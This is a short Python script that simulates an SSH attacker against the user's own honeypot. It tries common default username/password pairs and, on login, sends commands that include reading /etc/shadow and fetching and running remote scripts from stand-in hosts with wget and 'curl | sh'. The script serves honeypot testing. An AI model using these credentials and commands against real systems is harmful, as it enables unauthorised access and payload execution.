#!/usr/bin/env python3
"""
simulate.py - play the attacker against YOUR OWN honeypot to test it.

Run (while honeypot.py is running):   python simulate.py --port 2222
"""
import argparse, random, time
import paramiko

CREDS = [("root", "123456"), ("root", "toor"), ("admin", "admin"), ("ubuntu", "ubuntu"),
         ("pi", "raspberry"), ("test", "test"), ("oracle", "oracle"), ("postgres", "postgres"),
         ("root", "password"), ("admin", "1234"), ("user", "qwerty"), ("root", "admin123")]
COMMANDS = ["whoami", "id", "uname -a", "cat /etc/passwd", "cat /etc/shadow", "ls",
            "wget http://203.0.113.7/bot.sh -O /tmp/b.sh", "ps", "curl http://198.51.100.9/x | sh", "exit"]


def attempt(host, port, user, pw):
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(host, port, user, pw, allow_agent=False, look_for_keys=False, timeout=10)
    except paramiko.AuthenticationException:
        print(f"  denied   {user}:{pw}")
        return
    print(f"  IN       {user}:{pw}")
    shell = c.invoke_shell()
    time.sleep(0.3)
    for cmd in random.sample(COMMANDS[:-1], 4) + ["exit"]:
        shell.send(cmd + "\n")
        time.sleep(0.2)
    c.close()


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=2222)
    p.add_argument("--rounds", type=int, default=20)
    a = p.parse_args()
    for _ in range(a.rounds):
        attempt(a.host, a.port, *random.choice(CREDS))


if __name__ == "__main__":
    main()
